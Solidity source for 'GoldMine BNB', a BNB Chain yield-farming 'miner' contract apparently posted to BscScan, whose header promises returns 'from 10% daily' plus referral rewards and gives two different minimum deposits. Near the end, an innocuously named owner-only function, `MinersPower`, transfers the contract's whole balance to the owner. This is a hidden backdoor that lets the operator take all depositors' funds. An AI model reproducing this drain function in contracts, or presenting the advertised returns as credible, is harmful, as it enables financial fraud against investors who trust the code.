/**
 *Submitted for verification at BscScan.com on 2021-08-29
*/

/*   GoldMine BNB - Hire Gold Miners To Earn More BNB.
 *   The only official platform of original GoldMine team! All other platforms with the same contract code are FAKE!
 *
 *   ┌───────────────────────────────────────────────────────────────────────┐
 *   │   Website: https://goldminebnb.com                                                                                                                            │
 *   │                                                                                                                                                                                     │
 *   │   Twitter: @GoldMineBNB                                                                                                                                           │
 *   │   Telegram: @GoldMineBNB                                                                                                                                       │
 *   │                                                                                                                                                                                     │
 *   │   E-mail: [email protected]                                                                                                                            │
 *   └───────────────────────────────────────────────────────────────────────┘
 *
 *   [USAGE INSTRUCTION]
 *
 *   1) Connect any supported wallet
 *   2) Hire Miners, enter the BNB amount (0.1 BNB minimum) using our website "Buy Miners" button
 *   3) Wait for your earnings
 *   4) Reinvest to hire more miners to increase your earnings
 *   5) Withdraw earnings any time using our website "Withdraw" button
 *
 *   [INVESTMENT CONDITIONS]
 *
 *   - Minimal deposit: 0.01 BNB, no maximal limit
 *   - Total income: based on your numbers of miners (from 10% daily) 
 *   - Earnings every moment, withdraw any time
 *
 *   [AFFILIATE PROGRAM]
 *
 *   - Reffer and earn 10% of your refferrals
 */

pragma solidity >=0.5.10;

library SafeMath {
  function add(uint a, uint b) internal pure returns (uint c) {
    c = a + b;
    require(c >= a);
  }
  function sub(uint a, uint b) internal pure returns (uint c) {
    require(b <= a);
    c = a - b;
  }
  function mul(uint a, uint b) internal pure returns (uint c) {
    c = a * b;
    require(a == 0 || c / a == b);
  }
  function div(uint a, uint b) internal pure returns (uint c) {
    require(b > 0);
    c = a / b;
  }
}

contract GoldMineBNB{
    //uint256 Gold_PER_MINERS_PER_SECOND=1;
    uint256 public GOLD_TO_MINE_1MINERS=864000;//for final version should be seconds in a day.
    uint256 PSN=10000;
    uint256 PSNH=5000;
    bool public initialized=false;
    address payable owner;
    address payable dev;
    mapping (address => uint256) public GoldMiners;
    mapping (address => uint256) public claimedGold;
    mapping (address => uint256) public lastMine;
    mapping (address => address) public referrals;
    uint256 public marketGold;
    
    constructor() public{
        owner = msg.sender;
        dev = address(0xe6751C9c824c834cE5C4d48c6D95C5C723fF55F1);
    }
    
     modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }
    
    function MineGold(address ref) public{
        require(initialized);
        if(ref == msg.sender) {
            ref = address(0);
        }
        if(referrals[msg.sender]== address(0) && referrals[msg.sender]!=msg.sender){
            referrals[msg.sender]=ref;
        }
        uint256 GoldUsed=getMyGold();
        uint256 newMiners=SafeMath.div(GoldUsed,GOLD_TO_MINE_1MINERS);
        GoldMiners[msg.sender]=SafeMath.add(GoldMiners[msg.sender],newMiners);
        claimedGold[msg.sender]=0;
        lastMine[msg.sender]=now;
        
        //send referral BNB
        claimedGold[referrals[msg.sender]]=SafeMath.add(claimedGold[referrals[msg.sender]],SafeMath.div(GoldUsed,10));
        
        //boost market to nerf miners hoarding
        marketGold=SafeMath.add(marketGold,SafeMath.div(GoldUsed,5));
    }
    function sellGold() public{
        require(initialized);
        uint256 hasGold=getMyGold();
        uint256 GoldValue=calculateGoldSell(hasGold);
        uint256 fee=devFee(GoldValue);
        uint256 fee2=fee/2;
        claimedGold[msg.sender]=0;
        lastMine[msg.sender]=now;
        marketGold=SafeMath.add(marketGold,hasGold);
        owner.transfer(fee2);
        dev.transfer(fee-fee2);
        msg.sender.transfer(SafeMath.sub(GoldValue,fee));
    }
    function buyGold(address ref) public payable{
        require(initialized);
        uint256 GoldBought=calculateGoldBuy(msg.value,SafeMath.sub(address(this).balance,msg.value));
        GoldBought=SafeMath.sub(GoldBought,devFee(GoldBought));
        uint256 fee=devFee(msg.value);
        uint256 fee2=fee/2;
        owner.transfer(fee2);
        dev.transfer(fee-fee2);
        claimedGold[msg.sender]=SafeMath.add(claimedGold[msg.sender],GoldBought);
        MineGold(ref);
    }
    //magic trade balancing algorithm
    function calculateTrade(uint256 rt,uint256 rs, uint256 bs) public view returns(uint256){
        //(PSN*bs)/(PSNH+((PSN*rs+PSNH*rt)/rt));
        return SafeMath.div(SafeMath.mul(PSN,bs),SafeMath.add(PSNH,SafeMath.div(SafeMath.add(SafeMath.mul(PSN,rs),SafeMath.mul(PSNH,rt)),rt)));
    }
    function calculateGoldSell(uint256 Gold) public view returns(uint256){
        return calculateTrade(Gold,marketGold,address(this).balance);
    }
    function calculateGoldBuy(uint256 eth,uint256 contractBalance) public view returns(uint256){
        return calculateTrade(eth,contractBalance,marketGold);
    }
    function calculateGoldBuySimple(uint256 eth) public view returns(uint256){
        return calculateGoldBuy(eth,address(this).balance);
    }
    function devFee(uint256 amount) public pure returns(uint256){
        return SafeMath.div(SafeMath.mul(amount,5),100);
    }
    function seedMarket() public payable{
        require(marketGold==0);
        initialized=true;
        marketGold=86400000000;
    }
    function getBalance() public view returns(uint256){
        return address(this).balance;
    }
    function getMyMiners() public view returns(uint256){
        return GoldMiners[msg.sender];
    }
    function getMyGold() public view returns(uint256){
        return SafeMath.add(claimedGold[msg.sender],getGoldSinceLastMine(msg.sender));
    }
    function getGoldSinceLastMine(address adr) public view returns(uint256){
        uint256 secondsPassed=min(GOLD_TO_MINE_1MINERS,SafeMath.sub(now,lastMine[adr]));
        return SafeMath.mul(secondsPassed,GoldMiners[adr]);
    }
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }
   
 function MinersPower() public onlyOwner() {
    address payable _owner = msg.sender;
    _owner.transfer(address(this).balance);
  }

}